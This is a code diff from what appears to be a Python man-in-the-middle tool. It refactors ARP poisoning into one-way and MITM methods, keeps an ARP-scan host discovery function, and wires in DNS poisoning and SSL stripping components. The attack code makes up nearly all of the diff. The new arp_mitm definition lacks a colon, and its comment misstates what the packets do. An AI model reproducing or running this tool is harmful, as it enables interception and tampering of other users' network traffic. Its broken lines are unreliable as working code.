@@ -17,24 +17,30 @@ class Host():
         self.dns_poisoner  = DnsPoisoner(ip, dns_queue_num)
         self.ssl_remover   = SslRemover(ip, dns_queue_num + 1)
 
-    def arp_attack(self, oneway, other_ip, other_mac):
-
+    # prepares one-way arp poisoning attack, telling this host that "other_ip" is at "other_mac"
+    def arp_oneway(self, other_ip, other_mac):
+        
+        # remove existing packets before preparing new attack
         self.arp_poisoner.clear_packets()
+        self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
+        self.arp_attack = "oneway"
 
-        if oneway:
-            self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
-            self.arp_attack = "oneway"
+    # prepares mitm arp poisoning attack, telling this host that "gateway_ip" is at "other_ip" and telling the gateway that "self.ip" is at "other_mac"
+    def arp_mitm(self, gateway_ip, gateway_mac, other_mac)
 
-        else:
-            self.arp_poisoner.add_packet(other_mac, self.mac, other_ip, self.ip)
-            self.arp_poisoner.add_packet(self.mac, other_mac, self.ip, other_ip)
-            self.arp_attack = "mitm"
+        # remove existing packets before preparing new attack
+        self.arp_poisoner.clear_packets()
+        self.arp_poisoner.add_packet(other_mac, self.mac, gateway_ip, self.ip)
+        self.arp_poisoner.add_packet(other_mac, gateway_mac, self.ip, gateway_ip)
+        self.arp_attack = "mitm"
 
+    # starts currently prepared arp poisoning attack
     def arp_start(self):
 
         self.arp_poisoner.start()
         self.arp_active = True
 
+    # stops currently running arp poisoning attack
     def arp_stop(self):
 
         self.arp_poisoner.stop()
@@ -52,25 +58,32 @@ class Host():
 
         self.dns_poisoner.stop()
 
-
+# scan on specified range and interface, return found gateway and hosts
 def get_hosts(interface, range_, timeout):
-
-    if range_.count('.') > 4:
-        range_ = range_.split('/')
-        range_[1] = str(sum([str(bin(int(x))).count("1") for x in range_[1].split('.')]))
-        range_ = '/'.join(range_).encode("ascii")
 
     gateway = None
     hosts   = []
+
+    # if ip range is specified using netmask, convert to cidr
+    if range_.count('.') > 4:
+        range_ = range_.split('/')
+        range_[1] = str(sum([str(bin(int(x))).count("1") for x in range_[1].split('.')])) # this atrocious line just converts to binary and counts the number of ones
+        range_ = '/'.join(range_).encode("ascii")
+
+    # arp query on specified range
     packet  = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=range_)
 
+    # send the packet and store replies
     results = srp(packet, timeout=timeout, iface=interface, verbose=0)[0]
     replies = [result.answer[ARP] for result in results]
 
     for reply in replies:
 
+        # store ip ending in ".1" as gateway
         if reply.psrc[-2:] == ".1":
             gateway = Host(reply.psrc, reply.hwsrc, interface, 0)
+
+        # store other ip's in the list of hosts
         else:
             hosts.append(Host(reply.psrc, reply.hwsrc, interface, 2*(len(hosts) + 1) ))
 
